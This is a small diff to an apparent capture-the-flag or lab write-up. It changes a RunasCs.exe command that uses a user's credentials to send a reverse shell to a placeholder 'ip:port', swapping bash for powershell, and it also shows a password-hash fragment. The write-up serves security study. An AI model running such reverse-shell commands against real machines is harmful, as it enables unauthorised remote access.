@@ -281,7 +281,7 @@ sha256:50000:In2HPMqJEDzYOpdr2sUkhg==:l5BygNwk/lF8Q0db0hi/rVbCXU0RA32LbaRA79TWka
 Emily cannot log in remotely, so we use `RunasCs.exe` to catch a shell as Emily from our non-interactive shell.
 
 ```bash
-.\RunasCs.exe Emily 12345679 bash -r ip:port
+.\RunasCs.exe Emily 12345679 powershell -r ip:port
 ```
 
 ## Privilege Escalation
